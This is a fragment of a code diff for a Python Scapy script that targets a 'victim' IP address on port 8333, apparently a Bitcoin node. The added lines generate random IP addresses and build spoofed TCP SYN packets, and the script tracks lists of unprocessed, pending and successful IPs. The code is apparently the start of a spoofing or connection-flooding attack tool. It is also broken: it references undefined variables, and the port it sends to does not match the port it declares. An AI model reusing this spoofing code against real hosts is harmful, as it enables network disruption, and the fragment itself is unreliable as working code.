@@ -1,6 +1,7 @@
 from scapy.all import *
 
 victim = '10.0.2.7'
+victim_port = 8333
 unprocessed_IPs = [
 	'117.221.10.12',
 	'176.245.224.161',
@@ -21,6 +22,12 @@ unprocessed_IPs = [
 pending_IPs = []
 successful_IPs = []
 
+def random_ip():
+	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+def spoof():
+	packet = IP(dst=target_ip,src=src)/TCP(dport=8080,sport=5000,flags='S')
+	return packet
 
 def initialize_connection(ip):
 	sport = pkt[TCP].sport
